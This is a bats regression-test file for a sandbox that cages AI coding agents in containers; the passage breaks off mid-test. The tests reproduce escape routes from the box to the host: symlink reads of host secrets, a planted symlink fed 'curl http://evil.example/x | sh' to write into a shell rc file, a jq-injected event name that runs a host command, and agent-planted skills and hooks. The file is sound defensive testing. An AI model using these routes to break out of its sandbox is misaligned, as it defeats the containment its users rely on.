# `mv` moved the link without following it, the `<` redirect that delivered it
# DID follow it, and both presence gates used [ -f ], which dereferences. So a
# box could name any file the host user can read and have the host's own
# watcher pipe it into the host clipboard. Reproduced end to end on 2026-08-11.
#
# Three properties, one per test: a link is never read through, a link planted
# before startup is swept unaged, and the claim is renamed OUT of the shared
# directory so the box cannot swap it between the rename and the read.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression: a symlinked clipboard payload is never read through to the host" {
  local clip_dir="$TEST_TEMP/clip"
  mkdir -p "$clip_dir"
  echo "HOST-PRIVATE-KEY" > "$TEST_TEMP/secret"

  _clipboard_watcher "$clip_dir" "cat >> '$TEST_TEMP/copied'" >/dev/null 2>&1 &
  local pid=$!
  sleep 0.3
  # Exactly what the box can do today: plant the link, then rename it into
  # place the way the shim delivers a real payload (which is what fires the
  # watcher's moved_to).
  ln -s "$TEST_TEMP/secret" "$TEST_TEMP/evil"
  mv "$TEST_TEMP/evil" "$clip_dir/clipboard"
  sleep 2
  stop_watcher "$pid" "$clip_dir"

  if [ -f "$TEST_TEMP/copied" ]; then
    run cat "$TEST_TEMP/copied"
    refute_output --partial "HOST-PRIVATE-KEY"
  fi
  [ ! -e "$clip_dir/clipboard" ] && [ ! -L "$clip_dir/clipboard" ] || {
    echo "REGRESSION: the planted symlink survived instead of being dropped"; return 1; }
  run cat "$TEST_TEMP/secret"
  assert_output "HOST-PRIVATE-KEY"
}

@test "regression: a symlink planted before startup is swept, never delivered" {
  local clip_dir="$TEST_TEMP/clip"
  mkdir -p "$clip_dir" "$TEST_TEMP/bin"
  echo "HOST-PRIVATE-KEY" > "$TEST_TEMP/secret"
  # No age gate applies to a link. The shim only ever renames a regular file
  # into place, so a link is hostile at any age, including zero seconds old.
  ln -s "$TEST_TEMP/secret" "$clip_dir/clipboard"

  # Force the EVENT-DRIVEN branch, which is the only one where this matters and
  # the one real hosts take. A link planted BEFORE the watcher starts never
  # fires moved_to, so _do_copy never runs and the startup sweep is the only
  # thing that can remove it. Without this stub the polling fallback picks the
  # link up on its first tick and _do_copy's own guard drops it, so the test
  # passes whatever the sweep does. That is how this test first shipped, and
  # the mutation harness caught it.
  printf '#!/usr/bin/env bash\nsleep 30\nexit 1\n' > "$TEST_TEMP/bin/inotifywait"
  chmod +x "$TEST_TEMP/bin/inotifywait"
  PATH="$TEST_TEMP/bin:$PATH"

  _clipboard_watcher "$clip_dir" "cat >> '$TEST_TEMP/copied'" >/dev/null 2>&1 &
  local pid=$!
  sleep 1
  stop_watcher "$pid" "$clip_dir"

  [ ! -L "$clip_dir/clipboard" ] || {
    echo "REGRESSION: startup sweep left a planted symlink in place"; return 1; }
  [ ! -f "$TEST_TEMP/copied" ] || {
    echo "REGRESSION: the planted symlink was delivered to the host clipboard"; return 1; }
}

@test "regression: a dead session's watcher marker never latches .host-ready on" {
  # .watcher.<pid> markers carry the HOST pid of a clipboard watcher. The
  # cleanup tested mere EXISTENCE, so a marker left by a crashed session held
  # .host-ready on forever. docker/clip takes the file-bridge path whenever
  # .host-ready exists, so a session with no watcher running wrote its payload
  # to a bridge nobody was reading: the copy was swept as a stale leftover and
  # the OSC 52 fallback that would have worked was never tried. Found live with
  # two markers from two days earlier sitting next to the current one.
  local dir="$TEST_TEMP/clip"
  mkdir -p "$dir"

  # No background jobs: a child outliving the test makes bats miscount tests.
  # Live pid = this test's own shell. Dead pid = a subshell that has already
  # exited by the time the substitution returns, which beats guessing a number
  # the OS might be using.
  local live=$$
  local dead
  dead="$(sh -c 'echo $$')"

  touch "$dir/.watcher.$live" "$dir/.watcher.$dead" "$dir/.watcher.notanumber"
  _sweep_dead_watcher_markers "$dir"

  [ -e "$dir/.watcher.$live" ] || {
    echo "REGRESSION: swept a LIVE watcher's marker, which would drop .host-ready under a working bridge"; return 1; }
  [ ! -e "$dir/.watcher.$dead" ] || {
    echo "REGRESSION: a dead session's marker survived and will latch .host-ready on"; return 1; }
  [ ! -e "$dir/.watcher.notanumber" ] || {
    echo "REGRESSION: a malformed marker survived"; return 1; }

  # Last real watcher gone: nothing may remain to hold the latch on.
  rm -f "$dir/.watcher.$live"
  _sweep_dead_watcher_markers "$dir"
  run bash -c "ls '$dir'/.watcher.* 2>/dev/null; true"
  assert_output ""
}

@test "regression: a symlinked browser-bridge file is never read through" {
  # Same bug, same shared dir, different consumer: _browser_claim_url gated on
  # [ -f ] (dereferences), moved the link with mv (does not), then `cat`ed the
  # claim (does). So a box could name any host file and have the host read it.
  echo "HOST-PRIVATE-KEY" > "$TEST_TEMP/secret"
  ln -s "$TEST_TEMP/secret" "$TEST_TEMP/.browser-open"

  run _browser_claim_url "$TEST_TEMP/.browser-open"
  # Nothing claimed, and above all nothing from the target on stdout: that
  # string is what would have been handed to the host's browser opener.
  assert_failure
  refute_output --partial "HOST-PRIVATE-KEY"
  [ ! -L "$TEST_TEMP/.browser-open" ] || {
    echo "REGRESSION: the planted symlink survived the claim"; return 1; }
  run cat "$TEST_TEMP/secret"
  assert_output "HOST-PRIVATE-KEY"
}

@test "regression: a real browser-bridge URL still claims after the symlink guard" {
  # The guard must not cost the feature: a regular file still claims exactly
  # once and is consumed, which is the property the bridge exists for.
  printf '%s\n' "https://example.com/real" > "$TEST_TEMP/.browser-open"
  run _browser_claim_url "$TEST_TEMP/.browser-open"
  assert_success
  assert_output "https://example.com/real"
  [ ! -e "$TEST_TEMP/.browser-open" ] || {
    echo "REGRESSION: the bridge file was not consumed"; return 1; }
}

@test "regression: the browser claim honours a claim dir outside the mount" {
  # The watcher passes a directory the box cannot see, so the claim cannot be
  # swapped between the rename and the cat. Without the second argument the old
  # behaviour (claim beside the bridge file) is preserved for direct callers.
  #
  # Discriminating on an UNWRITABLE claim dir, because the claim file exists
  # only between the mv and the rm and cannot be observed directly. Honouring
  # the argument means the mv targets a dir that rejects it, so nothing is
  # claimed. Ignoring it means claiming beside the bridge file, which succeeds.
  # Asserting "no litter in outside/" instead was worthless: it is trivially
  # true when the directory is never touched, so it passed under the mutation.
  [ "$(id -u)" -ne 0 ] || skip "root ignores directory permissions"
  mkdir -p "$TEST_TEMP/outside"
  printf '%s\n' "https://example.com/x" > "$TEST_TEMP/.browser-open"
  chmod a-w "$TEST_TEMP/outside"

  run _browser_claim_url "$TEST_TEMP/.browser-open" "$TEST_TEMP/outside"
  chmod u+w "$TEST_TEMP/outside"

  assert_failure
  [ -f "$TEST_TEMP/.browser-open" ] || {
    echo "REGRESSION: claim_dir ignored, the URL was claimed from the wrong directory"; return 1; }
}

@test "regression: the clipboard claim is renamed out of the box-visible dir" {
  # The claim used to be created inside \$clip_dir, which the box has rw. A box
  # watching that directory could swap the claim for a symlink in the window
  # between the rename and the read. Renaming into a host-only sibling closes
  # the window instead of racing it.
  local clip_dir="$TEST_TEMP/clip"
  mkdir -p "$clip_dir"

  _clipboard_watcher "$clip_dir" \
    "ls '$clip_dir'/.claim.* >> '$TEST_TEMP/in-mount' 2>/dev/null; ls '$TEST_TEMP'/clipclaim/.claim.* >> '$TEST_TEMP/out-of-mount' 2>/dev/null; cat > '$TEST_TEMP/copied'" \
    >/dev/null 2>&1 &
  local pid=$!
  sleep 0.3
  echo "payload" > "$TEST_TEMP/payload"
  mv "$TEST_TEMP/payload" "$clip_dir/clipboard"
  sleep 2
  stop_watcher "$pid" "$clip_dir"

  run cat "$TEST_TEMP/copied"
  assert_output "payload"
  [ -s "$TEST_TEMP/out-of-mount" ] || {
    echo "REGRESSION: no claim existed outside the shared dir at delivery time"; return 1; }
  [ ! -s "$TEST_TEMP/in-mount" ] || {
    echo "REGRESSION: the claim is still created inside the bind-mounted dir"; return 1; }
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.2.5: on hosts with inotify-tools (or fswatch), _cleanup_session's plain
# `kill` on the clipboard watcher never reached the blocking inotifywait
# child: bash defers a subprocess's own TERM trap while it sits blocked in a
# foreground command, so the watcher (and inotifywait under it) survived
# cleanup as an orphan. Fix: cleanup also kills the watcher's blocking child
# (pkill -P) before waiting, which reaps it for real.
#
# NOTE on how this is verified: exec_claude disowns the watcher PID right
# after spawning it, and bash's `wait` on an already-disowned PID returns
# immediately whether or not the process has actually exited (confirmed by
# hand: it returns in the same tick, before or after the fix). So this test
# does NOT assert on `_cleanup_session` returning quickly, since it always
# does. The mutation-sensitive signal, confirmed empirically both ways, is
# whether inotifywait is still alive afterward: with the fix it is killed
# outright; without it, it (and the watcher shell wrapping it) are orphaned
# and linger. That leftover process is the real-world symptom (it keeps
# holding the run dir/terminal open), so this is what the test checks.
#
# This test only bites where inotifywait exists (the Linux CI leg installs
# it); elsewhere the polling fallback never had the leak and the test skips.
#
# It calls the REAL exec_claude (production code, not a copy) in a helper
# process, which defines and runs the REAL _cleanup_session. A slow-motion
# docker stub delays only the final `docker exec -it ...` launch call, giving
# the clipboard watcher exec_claude spawns time to actually enter its
# blocking inotifywait read before cleanup runs, so this reproduces the real
# race instead of a same-tick race that would pass either way.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.2.5: session cleanup reaps a watcher blocked in inotifywait" {
  command -v inotifywait >/dev/null 2>&1 || skip "inotifywait not installed"
  local cname="cleanup-hang-ctr"
  # The REAL clip dir exec_claude will compute for this cname: CLEAT_RUN_DIR
  # resolves from HOME (isolated to $TEST_TEMP/home by _common_setup), so this
  # must match _CLIP_DIR="$CLEAT_RUN_DIR/${cname}/clip", not a throwaway dir,
  # or the straggler check below silently watches the wrong path.
  local clip_dir="$HOME/.config/cleat/run/${cname}/clip"

  mkdir -p "$TEST_TEMP/shim"
  cat > "$TEST_TEMP/shim/docker" <<EOF
#!/usr/bin/env bash
if [ "\$1" = "exec" ]; then
  case " \$* " in
    *" -it "*) sleep 1 ;;
  esac
fi
exec "$MOCK_BIN/docker" "\$@"
EOF
  chmod +x "$TEST_TEMP/shim/docker"

  sed 's/^set -euo pipefail$/:/' "$CLI" > "$TEST_TEMP/cli_stripped"
  # Only _host_clip_cmd/_host_open_cmd are stubbed, to spawn just the clipboard
  # watcher (with a harmless "true" clip command) and skip the browser
  # watcher/hook bridge, which are out of scope here.
  cat > "$TEST_TEMP/cleanup_spawner.sh" <<EOF
export PATH="$TEST_TEMP/shim:\$PATH"
source "$TEST_TEMP/cli_stripped"
_host_clip_cmd() { echo "true"; }
_host_open_cmd() { echo ""; }
exec_claude "$cname" --dangerously-skip-permissions >/dev/null 2>&1
EOF

  # Bounded regardless: _cleanup_session's wait on this (disowned) watcher
  # PID never actually blocks, so the helper always returns quickly. The
  # timeout below is just a safety net against an unrelated wedge.
  _portable_timeout 15 bash "$TEST_TEMP/cleanup_spawner.sh"

  # Give a straggler inotifywait a brief moment to actually be reaped (or
  # not) before checking; the fix kills it synchronously inside cleanup, so
  # this is generous, not load-bearing.
  sleep 0.3

  if pgrep -f "inotifywait.*$clip_dir" >/dev/null 2>&1; then
    echo "REGRESSION: session cleanup left the clipboard watcher's inotifywait running" >&2
    pkill -9 -f "inotifywait.*$clip_dir" 2>/dev/null || true
    return 1
  fi
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.2.5: repo-controlled text (cap names, .cleat lines) is rendered via
# echo -e (see _sanitize_repo_str), so a cap name carrying a raw ESC byte or a
# literal backslash-escape sequence is a terminal-injection vector once it
# reaches _trust_prompt. Guard: a raw ESC byte is stripped before it ever
# reaches echo -e, and a literal `\033`-style sequence stays literal text
# (the backslash is doubled first, so echo -e prints it verbatim instead of
# decoding it into a control byte).
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.2.5: trust prompt neutralizes control bytes in repo cap names" {
  mkdir -p "$TEST_TEMP/proj"
  local esc
  esc="$(printf '\x1b')"
  {
    echo "[caps]"
    printf '%s\n' "cap${esc}BADESC"
    printf '%s\n' 'cap\033text'
  } > "$TEST_TEMP/proj/.cleat"

  local -a caps=()
  local c
  while IFS= read -r c; do [[ -n "$c" ]] && caps+=("$c"); done < <(_read_caps_from_file "$TEST_TEMP/proj/.cleat")

  run _trust_prompt "$TEST_TEMP/proj" "${caps[@]}" <<< "n"
  # The rendered prompt legitimately contains OTHER raw ESC bytes (the CLI's
  # own BOLD/DIM/RESET color codes), so a blanket refute of any ESC byte
  # would false-fail; check the specific injected sequence instead.
  assert_output --partial "BADESC"
  refute_output --partial "${esc}BADESC"
  assert_output --partial "033"
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.2.5: the trust file's 3-column row (path, box, caps hash) predates
# [setup]'s 4-column extension (see _trust_record) and every legacy row, and
# every plain caps-only approval, must keep that exact shape. A 3-arg
# _trust_record call must never grow a 4th column.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.2.5: caps-only trust rows keep the exact 3-column format" {
  _trust_record "$TEST_TEMP/proj" "capshash123" "main"
  local row expected
  row="$(awk -F'\t' -v p="$TEST_TEMP/proj" '$1==p' "$CLEAT_TRUST_FILE")"
  expected="$(printf '%s\tmain\tcapshash123' "$TEST_TEMP/proj")"
  [[ "$row" == "$expected" ]] || { echo "got: $row"; return 1; }
  local tabs
  tabs="$(printf '%s' "$row" | tr -cd '\t' | wc -c | tr -d ' ')"
  [[ "$tabs" == "2" ]] || { echo "tab count: $tabs (row: $row)"; return 1; }
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.2.5: the [setup] consent preview renders repo-controlled payload lines
# through echo -e (see _setup_trust_prompt / _sanitize_repo_str), and a lone
# carriage return (0x0d) rewinds the cursor to column 0. A payload line
# carrying a raw CR could overwrite what the user already read on that
# terminal row with different text, hiding what actually runs behind what
# looks like the approved preview. Guard: CR is in the stripped control-byte
# set, so it never reaches echo -e in the first place.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.2.5: [setup] consent preview neutralizes a carriage return" {
  local cr payload
  cr="$(printf '\r')"
  payload="$(printf 'echo REAL%secho FAKE' "$cr")"
  run _setup_trust_prompt "$TEST_TEMP/proj" "$payload" 1 <<< "n"
  assert_output --partial "echo REAL"
  assert_output --partial "echo FAKE"
  # No other rendered text in this prompt legitimately carries a raw CR (the
  # CLI's own color codes are ESC-based, never CR), so a blanket refute is
  # safe here, unlike the ESC checks elsewhere which must stay scoped.
  refute_output --partial "$cr"
}

# ─────────────────────────────────────────────────────────────────────────────
# .cleat editor (config resources): _write_caps_to_file rewrites a project
# .cleat in place, preserving every section it does not own. Its preserve loop
# read `while IFS= read -r line`, which drops the FINAL line of a file that
# ends WITHOUT a trailing newline (read returns non-zero at EOF and the last
# line is lost). [setup] is exactly the section users hand-edit, and a hand
# written .cleat commonly ends `script build.sh` with no final newline, so a
# later caps write (e.g. the new generate-project flow, or cleat config
# --project --enable) silently corrupted the last [setup] line. The `||
# [[ -n "$line" ]]` guard keeps it, matching _read_section_from_file and the
# resources/kits writers.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression: caps writer keeps a no-trailing-newline final [setup] line" {
  printf '[caps]\nssh\n[setup]\nscript build.sh' > "$TEST_TEMP/cleat"   # NO trailing newline
  _write_caps_to_file "$TEST_TEMP/cleat" git env
  run cat "$TEST_TEMP/cleat"
  assert_output --partial "script build.sh"
  assert_output --partial "[setup]"
  assert_output --partial "git"
  assert_output --partial "env"
}

# ─────────────────────────────────────────────────────────────────────────────
# Every host-side watcher (clipboard, browser, hook bridge) is backgrounded
# with its stdout+stderr redirected to a per-box .watcher-log, NOT the
# interactive terminal. Under a heavy multi-agent load the host hits its
# process cap, and a backgrounded watcher that inherits the terminal's fd 2
# prints bash's own "fork: Resource temporarily unavailable" straight into the
# Claude Code TUI, corrupting it. Guard: a watcher that writes to its stderr
# lands in the log (proving the redirect targets a debuggable file, not the
# terminal and not /dev/null), and the caller's fd 2 stays clean.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression: watchers redirect fork-error stderr to a log, not the terminal" {
  local cname="watcher-fd2-ctr"
  # The real clip dir exec_claude computes for this cname (isolated HOME).
  local clip_dir="$HOME/.config/cleat/run/${cname}/clip"
  mkdir -p "$clip_dir"
  # A leftover clipboard payload makes the watcher's startup call _path_mtime,
  # the synchronous stderr-emitting seam overridden below.
  : > "$clip_dir/clipboard"

  # Docker shim: sleep on the interactive session exec so the backgrounded
  # watcher has a window to run its startup and write to its stderr before
  # cleanup kills it (same technique as the cleanup-reap regression above).
  mkdir -p "$TEST_TEMP/shim"
  cat > "$TEST_TEMP/shim/docker" <<EOF
#!/usr/bin/env bash
if [ "\$1" = "exec" ]; then
  case " \$* " in
    *" -it "*) sleep 1 ;;
  esac
fi
exec "$MOCK_BIN/docker" "\$@"
EOF
  chmod +x "$TEST_TEMP/shim/docker"

  sed 's/^set -euo pipefail$/:/' "$CLI" > "$TEST_TEMP/cli_stripped"
  cat > "$TEST_TEMP/watcher_spawner.sh" <<EOF
export PATH="$TEST_TEMP/shim:\$PATH"
source "$TEST_TEMP/cli_stripped"
# Spawn only the clipboard watcher (browser watcher + hook bridge skipped).
_host_clip_cmd() { echo "true"; }
_host_open_cmd() { echo ""; }
# Force a synchronous write to the watcher's OWN stderr during its startup.
# Path-guarded to the clipboard leftover sweep so no parent code path trips it.
_path_mtime() {
  case "\$1" in
    */clipboard) echo "WATCHER_FD2_SENTINEL" >&2 ;;
  esac
  echo 0
}
# Capture exec_claude's fd 2 (the caller the watcher must not leak into).
exec_claude "$cname" --dangerously-skip-permissions >/dev/null 2>"$TEST_TEMP/caller-stderr"
EOF

  _portable_timeout 15 bash "$TEST_TEMP/watcher_spawner.sh" || true

  # The watcher wrote its stderr to the per-box log: proves it ran AND that the
  # redirect targets a debuggable file, not the terminal and not /dev/null.
  run grep -q "WATCHER_FD2_SENTINEL" "$clip_dir/.watcher-log"
  assert_success
  # ...and it did NOT leak into the caller's fd 2 (the terminal in production).
  run grep -q "WATCHER_FD2_SENTINEL" "$TEST_TEMP/caller-stderr"
  assert_failure
}

@test "regression: a caged agent cannot write the host ~/.claude/skills" {
  # Live probe on the maintainer's machine, 2026-07-25: inside a box,
  # `touch ~/.claude/commands/.probe` and `touch ~/.claude/agents/.probe` both
  # returned "Read-only file system" while `touch ~/.claude/skills/.probe`
  # SUCCEEDED. ~/.claude is bind-mounted read-write and only three surfaces
  # were masked, so the caged agent could plant a skill in the HOST's
  # ~/.claude/skills. That is worse than a planted slash command: a skill is an
  # auto-load plugin source, discovered and model-invoked with no user action.
  # The fix masks skills (and plugins) :ro over the base mount, seeded with a
  # pass-through copy so the box still READS the user's own skills.
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project" "$HOME/.claude/skills/my-tool"
  echo "the skill" > "$HOME/.claude/skills/my-tool/SKILL.md"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"

  run cmd_run "$TEST_TEMP/project"
  assert_success
  # the mask is mounted, and it is read-only
  run assert_docker_run_has "$cname" "/kit/skills:/home/coder/.claude/skills:ro"
  assert_success
  # ...and the box still reads the user's real skill through the seed copy
  run cat "$CLEAT_RUN_DIR/$cname/kit/skills/my-tool/SKILL.md"
  assert_output "the skill"
}

@test "regression: a caged agent cannot read another project's Claude transcripts" {
  # Measured on the maintainer's machine 2026-07-25: ~/.claude/projects held
  # 976 MB across 24 directories, one per project ever run under Claude Code,
  # all readable and writable from inside any box, plus 185 MB of versioned
  # file snapshots in file-history/ carrying content from unrelated projects.
  # A :ro self-mask does NOT fix this: measured, it blocks writes while leaving
  # a sibling transcript fully readable. The fix mounts a GENERATED parent
  # holding only this project's keys, so the host content is never mounted.
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  mkdir -p "$HOME/.claude/projects/-Users-someone-other-secret-project"
  echo "OTHER PROJECT SECRET" > "$HOME/.claude/projects/-Users-someone-other-secret-project/t.jsonl"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"

  run cmd_run "$TEST_TEMP/project"
  assert_success

  # the host projects dir is never mounted onto the container path
  run assert_docker_run_lacks "$cname" "$HOME/.claude/projects:/home/coder/.claude/projects"
  assert_success
  # a generated parent is mounted there instead, read-only
  run assert_docker_run_has "$cname" "$cname/home/projects:/home/coder/.claude/projects:ro"
  assert_success
  # and it contains only this project's keys, so the sibling is not present
  run bash -c "ls -A \"$CLEAT_RUN_DIR/$cname/home/projects\""
  refute_output --partial "other-secret-project"
}

@test "regression: a caged agent cannot plant a host hook script" {
  # ~/.claude/hooks was the last instruction-shaped surface riding the
  # read-write ~/.claude mount unmasked, and it is the one with the worst
  # consequence. The hooks capability executes the user's hook commands ON THE
  # HOST (_execute_host_hooks), and the documented way to write one names a
  # script under ~/.claude/hooks/. So a caged agent could overwrite that script,
  # trigger any tool event, and have the bridge run its content outside the box
  # as the user. Masking it :ro would stop the write but still hand the cage the
  # user's hook scripts to read; the box provably never needs them, because with
  # the cap ON every in-box hook command is rewritten to the forwarder and with
  # it OFF hooks are deleted, so the dir becomes a per-box empty instead.
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project" "$HOME/.claude/hooks"
  echo "echo HOST HOOK CONTENT" > "$HOME/.claude/hooks/notify.sh"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"

  run cmd_run "$TEST_TEMP/project"
  assert_success

  # the host hooks dir is never mounted onto the container path
  run assert_docker_run_lacks "$cname" "$HOME/.claude/hooks:/home/coder/.claude/hooks"
  assert_success
  # this box's own generated dir is mounted there instead
  run assert_docker_run_has "$cname" "$cname/home/hooks:/home/coder/.claude/hooks"
  assert_success
  # and the user's real hook script is not inside it
  run bash -c "ls -A \"$CLEAT_RUN_DIR/$cname/home/hooks\""
  refute_output --partial "notify.sh"
}

@test "regression: a forwarded event cannot inject a jq program into the host bridge" {
  # The host bridge selected hook entries with the event name pasted into the
  # jq PROGRAM: jq -c ".hooks.\"$event_name\" // [] | .[]". event_name comes
  # from a line the container appended to the forwarding spool, which the hooks
  # capability bind-mounts read-write into the box. An event name carrying a
  # double quote therefore rewrote the program and returned an attacker-authored
  # hook entry regardless of the user's settings, and _execute_host_hooks then
  # ran that command on the HOST. Enabling the cap is consent to run YOUR hooks
  # on your machine, not consent to let the box choose the command.
  local settings="$TEST_TEMP/settings.json"
  jq -n --arg c "touch $TEST_TEMP/USER_HOOK_RAN" \
    '{hooks:{PreToolUse:[{hooks:[{type:"command",command:$c}]}]}}' > "$settings"
  local evil='X" // [{"hooks":[{"type":"command","command":"touch '"$TEST_TEMP"'/PWNED"}]}] // "'

  # the selection must treat the name as DATA and match nothing
  run jq -c --arg ev "$evil" '.hooks[$ev] // [] | .[]' "$settings"
  assert_success
  assert_output ""

  # end to end: a forged event naming the injected program runs no host command
  _RESOLVED_PROJECT="$TEST_TEMP/project"
  mkdir -p "$TEST_TEMP/project"
  local event
  event="$(jq -cn --arg ev "$evil" '{hook_event_name:$ev}')"
  run _execute_host_hooks "$event" "$settings"
  assert_success
  [ ! -e "$TEST_TEMP/PWNED" ] || { echo "host command executed from a forged event"; return 1; }

  # ...while a legitimate event still reaches the user's own hook. This half is
  # the positive control: without it, deleting the selection entirely would
  # pass the assertion above.
  event="$(jq -cn '{hook_event_name:"PreToolUse"}')"
  run _execute_host_hooks "$event" "$settings"
  assert_success
  [ -e "$TEST_TEMP/USER_HOOK_RAN" ] || { echo "the user's own hook did not run"; return 1; }
}

# ─────────────────────────────────────────────────────────────────────────────
# vnext: the clip dir is bind-mounted read-write into the box, and the browser
# watcher appended the claimed URL to .proxy-log with a plain `>>`, which
# FOLLOWS a symlink. A caged process could therefore point that path at any
# file the host user can write and, because a URL carrying a newline still
# passed the http(s) prefix test, write whole lines of its choosing into it.
# A shell rc file made that host code execution.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression vnext: browser bridge cannot append to a host file through a planted proxy log symlink" {
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  printf 'echo original\n' > "$TEST_TEMP/fake-rc"

  _browser_watcher "$dir" "true" "" "always" "0" >/dev/null 2>&1 &
  local wpid=$!
  sleep 0.7
  # Planted AFTER the watcher is up, which is the real attack: a startup-only
  # guard never sees this one.
  rm -f "$dir/.proxy-log"
  ln -s "$TEST_TEMP/fake-rc" "$dir/.proxy-log"
  printf 'https://x.example/a\ncurl http://evil.example/x | sh' > "$dir/.browser-open"
  sleep 2
  kill "$wpid" 2>/dev/null || true; wait "$wpid" 2>/dev/null || true

  run cat "$TEST_TEMP/fake-rc"
  assert_output "echo original"
  [ ! -L "$dir/.proxy-log" ] || {
    echo "REGRESSION: the planted symlink survived"; return 1; }
}

@test "regression vnext: cap watcher log does not truncate a host file through a symlink" {
  local target="$TEST_TEMP/precious-log"
  head -c 1200000 /dev/zero | tr '\0' 'q' > "$target"
  ln -s "$target" "$TEST_TEMP/.watcher-log"
  run _cap_watcher_log "$TEST_TEMP/.watcher-log"
  assert_success
  local sz; sz="$(wc -c < "$target" | tr -d '[:space:]')"
  [ "$sz" -gt 1000000 ] || {
    echo "REGRESSION: the link target was truncated to $sz bytes"; return 1; }
}

@test "regression vnext: a symlink at the host-ready sentinel is replaced, never touched through" {
  local clip_dir="$TEST_TEMP/clip-hr"; mkdir -p "$clip_dir"
  local target="$TEST_TEMP/hr-target-must-not-exist"
  ln -s "$target" "$clip_dir/.host-ready"
  _clipboard_watcher "$clip_dir" "cat > /dev/null" >/dev/null 2>&1 &
  local pid=$!
  local i
  for i in 1 2 3 4 5 6 7 8 9 10; do
    [ -f "$clip_dir/.host-ready" ] && [ ! -L "$clip_dir/.host-ready" ] && break
    sleep 0.3
  done
  stop_watcher "$pid" "$clip_dir"
  [ ! -e "$target" ] || {
    echo "REGRESSION: touch followed the planted link and created the target"; return 1; }
}

@test "regression vnext: the python callback proxy does not co-bind an occupied loopback port" {
  # SO_REUSEPORT let a box-named port co-bind a live host service that also set
  # it, taking a share of that service's connections. The backend must fail its
  # bind and retry instead.
  command -v python3 >/dev/null 2>&1 || skip "python3 not available"
  mkdir -p "$TEST_TEMP/nosocat2"
  local b
  for b in bash date cat sleep python3; do ln -sf "$(command -v $b)" "$TEST_TEMP/nosocat2/$b"; done
  python3 - <<'PYSRV' > "$TEST_TEMP/holder.pid" 2>/dev/null &
import socket, sys, time
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
if hasattr(socket, 'SO_REUSEPORT'):
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
s.bind(('127.0.0.1', 45777)); s.listen(1)
time.sleep(20)
PYSRV
  local holder=$!
  sleep 1
  PATH="$TEST_TEMP/nosocat2" _auth_callback_proxy 45777 mybox "$TEST_TEMP/plog-rp" &
  local ppid=$!
  sleep 2.5
  kill "$ppid" 2>/dev/null || true; wait "$ppid" 2>/dev/null || true
  kill "$holder" 2>/dev/null || true; wait "$holder" 2>/dev/null || true
  run cat "$TEST_TEMP/plog-rp"
  assert_output --partial "bind attempt 1 failed"
}

@test "regression vnext: a busy package manager is named instead of a bare Install failed" {
  # A fresh cloud image runs its own updater on first boot, holding the dpkg
  # lock, so get.docker.com dies with "Could not get lock
  # /var/lib/dpkg/lock-frontend". cleat printed a bare "Install failed" and the
  # reader concluded cleat was broken when the fix was to wait a minute.
  # Observed on a stock Ubuntu 24.04 droplet, 2026-09-08.
  local stub="$TEST_TEMP/pkgbusy"
  mkdir -p "$stub"
  # apt-get is "running", every other name is not.
  cat > "$stub/pgrep" <<'PG'
#!/usr/bin/env bash
[ "$2" = "apt-get" ] && exit 0
exit 1
PG
  # The download succeeds and writes a script, the script fails the way apt does.
  cat > "$stub/curl" <<'CURL'
#!/usr/bin/env bash
out=""
while [ $# -gt 0 ]; do [ "$1" = "-o" ] && out="$2"; shift; done
[ -n "$out" ] && printf '#!/bin/sh\nexit 1\n' > "$out"
exit 0
CURL
  cat > "$stub/sudo" <<'SUDO'
#!/usr/bin/env bash
exit 1
SUDO
  chmod +x "$stub/pgrep" "$stub/curl" "$stub/sudo"

  _is_macos() { return 1; }
  _is_wsl() { return 1; }
  PATH="$stub:$PATH"

  run _offer_docker_install <<< "y"
  assert_failure
  assert_output --partial "the package manager is busy"
  assert_output --partial "apt-get is already running"
}

@test "regression vnext: a docker install failure with no busy manager still hands over the manual command" {
  # The plain failure path called error() and exited without ever printing
  # _docker_install_hint, so a reader whose install failed for any other reason
  # was left with no next step at all.
  local stub="$TEST_TEMP/pkgfree"
  mkdir -p "$stub"
  cat > "$stub/pgrep" <<'PG'
#!/usr/bin/env bash
exit 1
PG
  cat > "$stub/curl" <<'CURL'
#!/usr/bin/env bash
out=""
while [ $# -gt 0 ]; do [ "$1" = "-o" ] && out="$2"; shift; done
[ -n "$out" ] && printf '#!/bin/sh\nexit 1\n' > "$out"
exit 0
CURL
  cat > "$stub/sudo" <<'SUDO'
#!/usr/bin/env bash
exit 1
SUDO
  chmod +x "$stub/pgrep" "$stub/curl" "$stub/sudo"

  _is_macos() { return 1; }
  _is_wsl() { return 1; }
  PATH="$stub:$PATH"

  run _offer_docker_install <<< "y"
  assert_failure
  assert_output --partial "Install failed."
  assert_output --partial "Install Docker yourself with"
  refute_output --partial "the package manager is busy"
}

@test "regression vnext: the package-manager probe matches a command name, never a path or argument" {
  # Matching the full command line would fire on anything mentioning apt, which
  # on the failure path means blaming a lock that was never held. The ps
  # fallback (a minimal image with no procps pgrep) must compare basenames only.
  local stub="$TEST_TEMP/pkgname"
  mkdir -p "$stub"
  local b
  for b in bash cat printf; do
    [ -n "$(command -v $b 2>/dev/null)" ] && ln -sf "$(command -v $b)" "$stub/$b"
  done
  # Deliberately NO pgrep here, so _pkg_manager_busy takes the ps branch.
  # Decoys: a path whose BASENAME is not a manager, and a local wrapper whose
  # name merely contains one. Neither may match.
  cat > "$stub/ps" <<'PS'
#!/usr/bin/env bash
printf '%s\n' /usr/lib/apt/apt.systemd.daily-helper
